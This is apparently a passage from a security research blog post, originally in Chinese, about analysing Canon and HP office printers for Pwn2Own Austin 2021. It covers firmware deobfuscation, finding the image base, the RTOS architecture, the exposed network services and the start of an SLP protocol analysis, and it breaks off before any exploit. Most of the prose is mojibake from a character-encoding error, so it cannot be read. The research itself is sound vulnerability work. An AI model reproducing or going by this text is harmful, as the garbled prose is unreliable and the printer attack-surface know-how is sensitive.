&lt;p&gt;Êó©ÊúüÂú®‰ΩøÁî®Âç∞Ë°®Ê©üÊôÇÔºåÂæÄÂæÄÊúÉÈúÄË¶Å‰ΩøÁî® IEEE1284 ÊàñÊòØ USB ÁöÑ Printer cable ‰æÜÂ∞áÂç∞Ë°®Ê©üÊé•‰∏äÈõªËÖ¶Ôºå‰∏¶‰∏îÂú®‰ΩøÁî®ÊôÇÊúÉÈ°çÂ§ñË£ù‰∏äÂª†ÂïÜÊâÄÈôÑÁöÑÈ©ÖÂãïÁ®ãÂºè„ÄÇËÄåÁèæ‰ªäÁöÑÂç∞Ë°®Ê©üÂ∑≤ÂèØ‰ª•Êé•‰∏äÁ∂≤Ë∑ØÔºå‰∏¶Â§ö‰∫ÜÂêÑÂºèÂêÑÊ®£ÁöÑÂäüËÉΩÔºåÈÄöÂ∏∏Âè™Ë¶ÅÂ∞áÂç∞Ë°®Ê©üÊé•‰∏äÂçÄÁ∂≤ÔºåÂçÄÁ∂≤‰∏≠ÁöÑÈõªËÖ¶Â∞±ÂèØ‰ª•ËºïÊòìÂú∞ÁôºÁèæ‰Ω†ÊâÄÊñ∞ÂÆâË£ùÁöÑÂç∞Ë°®Ê©ü„ÄÇ&lt;/p&gt;

&lt;p&gt;ÁõÆÂâçÂ∏ÇÈù¢‰∏äÁöÑÂç∞Ë°®Ê©üÈ†êË®≠ÈÉΩÈñã‰∫ÜÈùûÂ∏∏Â§öÁöÑÊúçÂãôÔºå‰∏çÂ§ñ‰πéÂ∞±ÊòØÁÇ∫‰∫ÜËÆìÂàóÂç∞Êõ¥Âä†Êñπ‰æøÔºåÂÉèÊòØ FTP„ÄÅAirPrint„ÄÅBonjour Á≠âÁ≠âÊúçÂãô„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;motivation&quot;&gt;Motivation&lt;/h2&gt;

&lt;h3 id=&quot;ÁÇ∫‰ΩïË¶ÅÁ†îÁ©∂Âç∞Ë°®Ê©üÂë¢&quot;&gt;ÁÇ∫‰ΩïË¶ÅÁ†îÁ©∂Âç∞Ë°®Ê©üÂë¢Ôºü&lt;/h3&gt;

&lt;h4 id=&quot;Á¥ÖÈöäÂÖßÁ∂≤ÈúÄÊ±Ç&quot;&gt;Á¥ÖÈöäÂÖßÁ∂≤ÈúÄÊ±Ç&lt;/h4&gt;
&lt;p&gt;ÈÅéÂéªÊàëÂÄëÂúòÈöäÂú®Âü∑Ë°åÁ¥ÖÈöäÊºîÁ∑¥ÈÅéÁ®ã‰∏≠ÔºåÂç∞Ë°®Ê©üÊôÆÈÅçÂá∫ÁèæÊñºÁèæ‰ª£‰ºÅÊ•≠ÂÖßÁ∂≤‰∏≠ÔºåÂπæ‰πéÈÉΩÊúÉÊúâ‰∏ÄÂè∞‰ª•‰∏äÔºå‰ΩÜÂæÄÂæÄÊòØË¢´ÂøΩÁï•ÁöÑ‰∏ÄÂ°äÔºå‰πüÂ∏∏Â∏∏Ê≤íÂú®Êõ¥Êñ∞„ÄÇÂç∞Ë°®Ê©üÊú¨Ë∫´‰πüÈùûÂ∏∏ÈÅ©Âêà‰ΩúÁÇ∫ÊîªÊìäËÄÖÁöÑËóèË∫´ËôïÔºåÈÄöÂ∏∏ÂæàÈõ£Ë¢´ÂÅµÊ∏¨Âá∫‰æÜ„ÄÇÂÄºÂæó‰∏ÄÊèêÁöÑÊòØÊØîËºÉÂ§ßÂûãÁöÑ‰ºÅÊ•≠‰πüÂæàÊúâÂèØËÉΩÂ∞áÂÖ∂Êé•‰∏ä ADÔºåÊàêÁÇ∫Áç≤ÂèñÊ©üÂØÜË≥áË®äÁöÑÂÖ•Âè£„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;pwn2own-austin-2021&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;Âè¶Â§ñ‰∏ÄÈªûÊòØÂç∞Ë°®Ê©üÂú® 2021 ÊôÇÔºåÈ¶ñÊ¨°ÊàêÁÇ∫‰∫Ü Pwn2Own Mobile ‰∏ªË¶ÅÊé®ÂãïÁöÑÁõÆÊ®ô‰πã‰∏ÄÔºåËÄåÊàëÂÄëÂâõÂ•ΩÁï∂ÊôÇ‰πüÊ∫ñÂÇôÂÜçÊ¨°ÊåëÊà∞ Pwn2Own ËàûÂè∞Ôºå‰æøÊ±∫ÂÆö‰∏ÄÊé¢Á©∂Á´ü„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ëµ∑ÂàùÊàëÂÄëÂéüÊú¨‰ª•ÁÇ∫ÈùûÂ∏∏Á∞°ÂñÆÔºåË∑üÂ§öÊï∏ÁöÑ IoT Ë®≠ÂÇô‰∏ÄÊ®£ÔºåËÉΩËºïÊòìÁöÑÊâæÂà∞ Command injection ÂïèÈ°åÔºåÊÆä‰∏çÁü•Êúâ‰∏çÂ∞ëÂç∞Ë°®Ê©üÈÉΩÊòØ‰ΩøÁî® RTOSÔºå‰∏¶Èùû‰∏ÄËà¨ÁöÑ Linux Á≥ªÁµ±Ôºå‰ΩÜÈÄôÊõ¥ÊòØÈ©ÖÂãï‰∫ÜÊàëÂÄëÊåëÊà∞ÂÆÉÁöÑÊ±∫ÂøÉ„ÄÇ&lt;/p&gt;

&lt;p&gt;Êú¨ÁØáÂ∞áÊúÉËëóÈáçÂú®ËºÉÁÇ∫Á≤æÂΩ©ÁöÑ Canon Âèä HP ÈÉ®ÂàÜÔºåLexmark ÊúâÊ©üÊúÉÂÜçË´áË´á„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;
&lt;p&gt;ÂâõÈñãÂßãÁ†îÁ©∂ÁöÑÊôÇÂÄôÔºåÊàëÂÄëÂèÉËÄÉ‰∫ÜË®±Â§ö&lt;a href=&quot;https://chdk.fandom.com/wiki/DryOS_PIXMA_Printer_Shell&quot;&gt;Ë≥áÊñô&lt;/a&gt;ÈÉΩÊòØÈúÄË¶ÅÊãÜËß£Á°¨È´î‰æÜÂàÜÊûêÔºåÊâçËÉΩÁç≤Âæó debug consoleÔºåÂÜçÁî® dump memory ÊñπÂºè‰æÜÁç≤ÂèñÂéüÂßãÁöÑ firmware„ÄÇ‰ΩÜÊúÄÁµÇÊàëÂÄëÊé°Áî®‰∫ÜÂÖ∂‰ªñÁöÑÊñπÂºèÔºå‰∏¶Ê≤íÊúâÊãÜËß£‰ªª‰Ωï‰∏ÄÂè∞Âç∞Ë°®Ê©ü„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;canon&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;firmware-extract&quot;&gt;Firmware Extract&lt;/h4&gt;
&lt;p&gt;ÂàùÂßãÂàÜÊûêÁâàÊú¨ÁÇ∫ v6.03ÔºåÊàëÂÄë‰∏ÄÈñãÂßã‰ΩøÁî® &lt;a href=&quot;https://github.com/ReFirmLabs/binwalk&quot;&gt;binwalk&lt;/a&gt; ÂéªËß£ÊûêÂÆÉÔºå‰ΩÜ firmware ÊòØÁ∂ìÈÅéÊ∑∑Ê∑ÜÁöÑÔºåÊàëÂÄë‰∏¶Ê≤íËæ¶Ê≥ïÁõ¥Êé•Ëß£Èñã„ÄÇ&lt;/p&gt;

&lt;p&gt;Âúñ: Á∂ìÈÅéÊ∑∑Ê∑ÜÁöÑ Canon ImageCLASS MF644Cdw fimware 
&lt;img src=&quot;/assets/img/blog/20231005/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÈÄôÈÇä‰πüÂòóË©¶ÈÅé‰∫Ü &lt;a href=&quot;https://www.synacktiv.com/publications/treasure-chest-party-quest-from-doom-to-exploit.html&quot;&gt;TREASURE CHEST PARTY QUEST: FROM DOOM TO EXPLOIT&lt;/a&gt; by Synacktiv Âèä &lt;a href=&quot;https://web.archive.org/web/20220224100459/https://www.contextis.com/en/blog/hacking-canon-pixma-printers-doomed-encryption&quot;&gt;Hacking Canon Pixma Printers¬†‚Äì¬†Doomed Encryption&lt;/a&gt; by Contextis Research ÁöÑÁ†îÁ©∂Ôºå‰ΩÜÈÄôÊ¨°ÊòØÂÆåÂÖ®‰∏çÂêåÁöÑÁ≥ªÂàóÔºåÊàëÂÄëÁÑ°Ê≥ï‰ΩøÁî®ÂêåÊ®£ÁöÑÊñπÊ≥ïËß£ÈñãÊ∑∑Ê∑ÜÈÅéÁöÑ firmware„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊñºÊòØÊàëÂÄëÈñãÂßãÂàÜÊûêÊ∑∑Ê∑ÜÈÅéÁöÑ firmware Ê†ºÂºèÂèäÂÖßÂÆπ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂ§ßËá¥‰∏äÂèØ‰ª•ÂæûÊ∑∑Ê∑ÜÈÅéÁöÑ firmware ÁúãÂà∞ÔºåÊØèÂÄãÊ∑∑Ê∑ÜÈÅéÁöÑ firmware ÁöÑÈñãÈ†≠ÈÉΩÊúÉÊòØ NCFW ÈÄôÂÄã MagicÔºå‰∏¶Â∏∂ÊúâË©≤ firmware Â§ßÂ∞èÔºåËÄåÂÖ∂‰ªñÈÉ®ÂàÜÂâáÊòØÊ∑∑Ê∑ÜÈÅéÁöÑË≥áÊñô„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊñºÊòØÊàëÂÄëÈñãÂßãÁåúÊÉ≥Ôºå‰πüË®±ÈÄôÂè∞Âç∞Ë°®Ê©üËàäÁâàÊú¨ÁöÑ firmware Ê≤íÊúâÊ∑∑Ê∑ÜÔºåÁõ¥Âà∞Êüê‰∏ÄÁâàÊâçÈñãÂßãÊ∑∑Ê∑ÜÔºåÂ¶ÇÊûúÂèØ‰ª•ÊäìÂà∞‰∏≠‰ªãÁâàÊú¨ÔºåÂèØËÉΩÊúâÊ©üÊúÉÁç≤ÂæóËß£Ê∑∑Ê∑ÜÁöÑÊñπÊ≥ï„ÄÇËÄåÈÄôÂÄã Magic ‰πüÂèØ‰ª•ËÆìÊàëÂÄëËæ®Âà•ÊòØ‰∏çÊòØÁ∂ìÈÅéÊ∑∑Ê∑ÜÁöÑ„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ª•‰∏ãÈÄôÂÄãÁ∂≤ÂùÄÊòØÈÄèÈÅéÂÆòÁ∂≤ÊàñÊòØÊì∑ÂèñÂ∞ÅÂåÖÁç≤ÂæóÁöÑ firmware ‰∏ãËºâÁ∂≤ÂùÄ&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://pdisp01.c-wss.com/gdl/WWUFORedirectTarget.do?id=MDQwMDAwNDc1MjA1&amp;amp;cmp=Z01&amp;amp;lang=EN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Á∂ìÈÅéÂàÜÊûêÂæåÔºåÂèØ‰ª•ÊãÜÂàÜÁÇ∫Â§öÂÄãÈÉ®ÂàÜ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Á¥ÑÁï•ÂèØ‰ª•Ê≠∏Á¥çÂá∫‰∏ãËºâÁ∂≤ÂùÄÁöÑË¶èÂâáÔºåÊàëÂÄëÂèØ‰ª•ËóâÁî±ÈÄôÂÄãÊñπÊ≥ï‰æÜËºâÂà∞ÊâÄÊúâÁâàÊú¨ÁöÑ firmwareÔºåÁï∂ÊôÇÊàëÂÄëËºâÂà∞ÁöÑÁâàÊú¨Êúâ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;V2.01&lt;/li&gt;
  &lt;li&gt;V4.02&lt;/li&gt;
  &lt;li&gt;V6.03&lt;/li&gt;
  &lt;li&gt;V9.03&lt;/li&gt;
  &lt;li&gt;V10.02&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ËÄå v10.02 ÊòØÂπæÂë®ÂæåÊúÉÈáãÂá∫ÁöÑÁâàÊú¨ÔºåÂèØ‰ª•ÂÖàÂæûÈÄôÈÇäÂÑ™ÂÖàËºâÂà∞„ÄÇËºâÂÆåÊâÄÊúâÁâàÊú¨ÂæåÔºåÊàëÂÄëÁôºÁèæË©≤Á≥ªÂàóÁâàÊú¨ÁöÑ firmware ÈÉΩÊòØÁ∂ìÈÅéÊ∑∑Ê∑ÜÁöÑÔºåÁÑ°Ê≥ïÂæûÂÖàÂâçÁâàÊú¨Áç≤ÂæóËß£Ê∑∑Ê∑ÜÁöÑÊñπÊ≥ï„ÄÇ‰ΩÜÊàëÂÄëÂèØ‰ª•‰∏ãËºâ Canon ÂÖ∂‰ªñÁ≥ªÂàóÁöÑÂç∞Ë°®Ê©üÔºåÂòóË©¶ÊâæÊâæÊòØÂê¶ÊúâÈ°û‰ººÁöÑÊ∑∑Ê∑ÜÊºîÁÆóÊ≥ï„ÄÇËºâÂÆåÁ¥ÑÊúâ 130 GB Â§ßÂ∞è„ÄÇÈÄèÈÅé grep Êâæ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NCFW&lt;/code&gt; Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;servicemode.html&lt;/code&gt; ÂèØ‰ª•ÊâæÂà∞Êú™Ê∑∑Ê∑ÜÁöÑ firmware„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊúÄÂæåÊâæÂà∞ÂõõÁµÑÁ¨¶ÂêàÊ¢ù‰ª∂ÁöÑ firmwareÔºåÊàëÂÄëÈÄôÈÇäÈÅ∏Êìá‰∫Ü WG7000 Á≥ªÂàóÁöÑÂç∞Ë°®Ê©ü‰æÜÂàÜÊûêÔºå‰∏¶ÊâæÂà∞‰∫ÜÁñë‰ººËß£Ê∑∑Ê∑ÜÁöÑÂáΩÂºè„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÂæàÂπ∏ÈÅãÁöÑÔºåËóâÁî±ÈáçÂØ´ÈÄôÂÄãÂáΩÂºèÔºåÂèØ‰ª•Ëß£Âá∫ÊòéÊñáÁöÑ MF644Cdw firmware„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®Ëß£Âá∫ firmware ‰πãÂæåÔºåÂøÖÈ†àÊâæÂá∫ firmware ÁöÑ image base addressÔºåIDA ÊâçËÉΩÊúâÊïàÂú∞Ëæ®Âà•Ë∑ü reference„ÄÇÊ≠§ËôïÂèØÈÄèÈÅéÂ∏∏Ë¶ãÁöÑÂàÜÊûêÂ∑•ÂÖ∑ &lt;a href=&quot;https://github.com/sgayou/rbasefind&quot;&gt;rbasefind&lt;/a&gt; ‰æÜÊâæ image base„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰∏ÄÈñãÂßãÊâæÂá∫ÁöÑ base ÁÇ∫ 0x40b0000Ôºå‰ΩÜ‰∏üÈÄ≤ IDA ÂæåÔºåÂçªÁôºÁèæÂ§ßÈÉ®ÂàÜÁöÑ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ÂáΩÂºè&lt;/code&gt;Ëàá &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debug message&lt;/code&gt; ÁöÑÂ≠ó‰∏≤Â∞çÊò†‰∏çËµ∑‰æÜ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Â¶Ç‰∏äÂúñÊâÄÁ§∫Ôºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loc_4489AC08&lt;/code&gt; ÊáâË©≤ÊåáÂêëÂáΩÂºèÂêçÁ®±ÁöÑÂ≠ó‰∏≤ÔºåÁÑ∂ËÄåÊ≠§Âú∞ÂùÄÂçª‰∏çÊòØÊ≠£Â∏∏ÁöÑÂ≠ó‰∏≤ÔºåËÄåÊòØË¢´Áï∂Êàê code ÂçÄÊÆµÔºåÂÖßÂÆπ‰πü‰∏çÊòØÂ≠ó‰∏≤ÔºåË°®Á§∫Ê≠§‰ΩçÁΩÆ‰∏¶ÈùûÁúüÊ≠£‰ΩçÁΩÆÔºåËÄåÊòØÊúâ‰∫õË®±ÁöÑÂÅèÁßªÔºå‰ΩÜÊ≠£Â∏∏ function ÁöÑËß£ÊûêÊ≤íÁîöÈ∫ºÂ§™Â§ßÂïèÈ°å„ÄÇÈÄôÈÇäÂèØ‰ª•ÂÖàÊâæ‰∏ÄÂÄã&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Â∑≤Áü•ÂáΩÂºèÂêçÁ®±ÁöÑÂáΩÂºè&lt;/code&gt;ÂíåÊâæÂà∞Â±¨Êñº‰ªñÁöÑ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ÂáΩÂºèÂêçÁ®±Â≠ó‰∏≤&lt;/code&gt;‰æÜÂÅöË™øÊï¥ÔºåÊâæÂà∞ÂÖ∂‰∏≠Â∑ÆÁï∞ÁöÑ offset ÂæåÔºåÂ∞á image base Ë™øÂà∞Ê≠£Á¢∫‰ΩçÁΩÆÂ∞±ÂèØ‰ª•‰∫Ü„ÄÇÊúÄÁµÇÊâæÂà∞ÁöÑ image base ÁÇ∫ &lt;strong&gt;0x40affde0&lt;/strong&gt;„ÄÇË™øÊï¥ÂÆåÂæåÔºåÂèØÁúãÂà∞ÂéüÊú¨ÁöÑÂáΩÂºèÂ∑≤ÂèØÊ≠£Á¢∫Ë≠òÂà•ÂáΩÂºèÂêçÁ®±„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Êé•‰∏ã‰æÜÂ∞±ÂèØ‰ª•Ê≠£Â∏∏ÂàÜÊûê firmwareÔºåËÄåÂàùÊ≠•ÂàÜÊûêÂæåÂèØÂæóÁü•ÔºåCanon ImageCLASS MF644Cdw Êû∂ÊßãÂ¶Ç‰∏ã&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OS - DryOSV2
    &lt;ul&gt;
      &lt;li&gt;Customized RTOS by Canon&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ARMv7 32bit little-endian&lt;/li&gt;
  &lt;li&gt;Linked with application code into single image
    &lt;ul&gt;
      &lt;li&gt;Kernel&lt;/li&gt;
      &lt;li&gt;Service&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;hp&quot;&gt;HP&lt;/h3&gt;

&lt;p&gt;HP ÁöÑ firmware ÂèñÂæóÁõ∏Â∞çÂÆπÊòìË®±Â§öÔºåÊàëÂÄëÂèØ‰ª•ÈÄèÈÅé &lt;a href=&quot;https://github.com/fkie-cad/fact_extractor/issues/37&quot;&gt;binwalk -Z&lt;/a&gt; ‰æÜÁç≤ÂæóÊ≠£Á¢∫ÁöÑ firmwareÔºåÁ¥ÑÁï•ÈúÄË¶ÅËä± 3-4 Â§©Â∑¶Âè≥ÁöÑÊôÇÈñìÔºåËÄåÂÖ∂‰ªñÊâæ image base address Á≠âÊ≠•È©üÔºåÂâáËàá Canon Áõ∏ÂêåÔºåÊ≠§ËôïÂ∞±‰∏çË¥ÖËø∞„ÄÇÁ∂ìÈÅéÂàùÊ≠•ÂàÜÊûêÂæåÔºåHP Color LaserJet Pro MFP M283fdw Êû∂ÊßãÂ¶Ç‰∏ã&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OS
    &lt;ul&gt;
      &lt;li&gt;RTOS - Modify from ThreadX/Green Hills&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ARM11 Mixed-endian
    &lt;ul&gt;
      &lt;li&gt;Code - little-endian&lt;/li&gt;
      &lt;li&gt;Data - Big-endian&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;attack-surface&quot;&gt;Attack Surface&lt;/h2&gt;
&lt;p&gt;Âú®Áèæ‰ªäÂ∏ÇÈù¢‰∏äÂ§ßÂ§öÊï∏ÁöÑÂ§öÂäüËÉΩ‰∫ãÂãôÊ©ü‰∏≠ÔºåÈ†êË®≠ÈÉΩÊúÉÈñãÂïü‰∏ÄÂ†ÜÊúçÂãô&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;RUI&lt;/td&gt;
      &lt;td&gt;TCP 80/443&lt;/td&gt;
      &lt;td&gt;Web interface&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PDL&lt;/td&gt;
      &lt;td&gt;TCP 9100&lt;/td&gt;
      &lt;td&gt;Page Description Language&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PJL&lt;/td&gt;
      &lt;td&gt;TCP 9100&lt;/td&gt;
      &lt;td&gt;Printer Job Language&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;IPP&lt;/td&gt;
      &lt;td&gt;TCP 631&lt;/td&gt;
      &lt;td&gt;Internet Printing Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;LPD&lt;/td&gt;
      &lt;td&gt;TCP 515&lt;/td&gt;
      &lt;td&gt;Line Printer Daemon Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SNMP&lt;/td&gt;
      &lt;td&gt;UDP 161&lt;/td&gt;
      &lt;td&gt;Simple Network Management Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SLP&lt;/td&gt;
      &lt;td&gt;TCP 427&lt;/td&gt;
      &lt;td&gt;Service Location Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;mDNS&lt;/td&gt;
      &lt;td&gt;UDP 5353&lt;/td&gt;
      &lt;td&gt;Multicast DNS&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;LLMNR&lt;/td&gt;
      &lt;td&gt;UDP 5355&lt;/td&gt;
      &lt;td&gt;Link-Local Multicast Name Resolution&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;‚Ä¶&lt;/td&gt;
      &lt;td&gt;‚Ä¶&lt;/td&gt;
      &lt;td&gt;‚Ä¶&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;‰∏ÄËà¨‰æÜË™™ÔºåÁÇ∫‰∫ÜÊñπ‰æøÁÆ°ÁêÜÔºåÈÄöÂ∏∏ÈÉΩÊúÉÈñã RUI (web ‰ªãÈù¢) ÔºåÂÜç‰æÜÊòØ 9100 Port ‰πüÊòØÂç∞Ë°®Ê©üÂ∏∏‰ΩøÁî®ÁöÑ PortÔºå‰∏ªË¶ÅÊúÉÁî®‰æÜÂÇ≥Ëº∏ÂàóÂç∞ÁöÑË≥áÊñô„ÄÇÂÖ∂‰ªñÈÉ®ÂàÜÂâáÊúÉ‰æùÁÖßÂª†ÂïÜ‰∏çÂêåËÄåÊúâÊâÄ‰∏çÂêåÔºå‰∏çÈÅé‰∏äËø∞ÊâÄÂàóÁöÑÊúçÂãôÈÄöÂ∏∏ÈÉΩÊúÉÊúâÔºå‰∏îÈ†êË®≠Â§ßÈÉ®ÂàÜÈÉΩÊòØÈñãÂïüÁöÑ„ÄÇÂú®Ë©ï‰º∞ÈÅéÈÄô‰∫õÊúçÂãôÂæåÔºåÊ±∫ÂÆöÊ≥®ÈáçÂú®ÁôºÁèæÊúçÂãôÂèä DNS Á≥ªÂàóÁöÑÂçîÂÆöÔºåÂõ†ÁÇ∫ÊàëÂÄëÁöÑÈï∑ÊúüÁ∂ìÈ©ó‰∏ã‰æÜÔºåÂ∏∏Â∏∏ËßÄÂØüÂà∞ vendor Âú®ÈñãÁôºÈÄô‰∫õÊúçÂãôÊôÇÔºåÂæÄÂæÄÊòØËá™Ë°åÈñãÁôºÂØ¶‰ΩúÔºåËÄå‰∏çÊòØ‰ΩøÁî®Â≠òÂú®Â∑≤‰πÖÁöÑ Open Source„ÄÇ‰ΩÜÂØ¶Èöõ‰∏ä‰æÜË™™ÔºåÂØ¶‰ΩúÈÄô‰∫õÂçîÂÆöÂæàÂÆπÊòìÂá∫ÁèæÂïèÈ°åÁöÑ„ÄÇÊàëÂÄëÁï∂ÊôÇ‰∏ªË¶ÅÂàÜÊûêÁöÑÊúçÂãô‰∏ªË¶ÅÊúâ &lt;strong&gt;SLP&lt;/strong&gt;„ÄÅ&lt;strong&gt;mDNS&lt;/strong&gt; Âèä &lt;strong&gt;LLMNR&lt;/strong&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;Êé•‰∏ã‰æÜÂ∞±‰ª• Pwn2Own Austin 2021 ‰ΩúÁÇ∫ Case StudyÔºå‰æÜÁúãÁúãÈÄô‰∫õÂçîÂÆöÂ∏∏ÊúÉÊúâÂì™‰∫õÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;hacking-printers-at-pwn2own&quot;&gt;Hacking printers at Pwn2Own&lt;/h2&gt;

&lt;h3 id=&quot;canon-1&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;service-location-protocol&quot;&gt;Service Location Protocol&lt;/h4&gt;
&lt;p&gt;SLP ÊòØ‰∏ÄÁ®ÆÊúçÂãôÁôºÁèæÂçîÂÆöÔºå‰∏ªË¶ÅÁî®ÊñºËÆìÈõªËÖ¶Âø´ÈÄüÊâæÂà∞Âç∞Ë°®Ê©üÔºåÈÅéÂéªÂú® ESXI ‰∏≠Ôºå&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/3/1/cve-2020-3992-amp-cve-2021-21974-pre-auth-remote-code-execution-in-vmware-esxi&quot;&gt;SLP ‰πüÂ∏∏Â∏∏Âá∫ÂïèÈ°å&lt;/a&gt;ÔºåËÄåÂú® Canon ÁöÑ SLP ÊúçÂãôÔºå‰∏ªË¶ÅÁî± Canon Ëá™Â∑±ÂØ¶‰ΩúÔºåSLP ÊúçÂãôÁ¥∞ÁØÄÂèØÂèÉËÄÉ &lt;a href=&quot;https://www.ietf.org/rfc/rfc2608.txt&quot;&gt;RFC2608&lt;/a&gt;„ÄÇÂú®ÊàëÂÄëÂàÜÊûê SLP ÂâçÂøÖÈ†àÂÖà‰∫ÜËß£ SLP Â∞ÅÂåÖÂ§ßËá¥‰∏äÁöÑÁµêÊßã&lt;/p&gt;

&lt;p&gt;Âúñ: SLP Packet Structure
&lt;img src=&quot;/assets/img/blog/20231005/12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôÈÇäÂè™ÈúÄË¶ÅÈóúÊ≥®&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function-id&lt;/code&gt;ÔºåÊ≠§Ê¨Ñ‰ΩçÊúÉÊ±∫ÂÆöË´ãÊ±ÇÂûãÊÖãÔºå‰πüÊúÉÊ±∫ÂÆö payload ÈÉ®ÂàÜÁöÑÊ†ºÂºè„ÄÇËÄå Canon Âè™ÊúâÂØ¶‰Ωú Service Request Âèä Attribute Request ÂÖ©Á®Æ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® Attribute Request (AttrRqst) ÁöÑË´ãÊ±Ç‰∏≠ÔºåÂÖÅË®±‰ΩøÁî®ËÄÖÂèØ‰ª•Ê†πÊìö service Âèä scope ‰æÜÁç≤Âæó attribute list„ÄÇ
scope ÂèØ‰ª•ÂÆöÁæ©Ë¶ÅÊâæÁöÑÁØÑÂúçÔºåÂ¶Ç canon Âç∞Ë°®Ê©ü„ÄÇ&lt;/p&gt;

&lt;p&gt;Example:
&lt;img src=&quot;/assets/img/blog/20231005/14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄå Attribute request ÁµêÊßãÂ§ßËá¥Â¶Ç‰∏ã&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/15.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

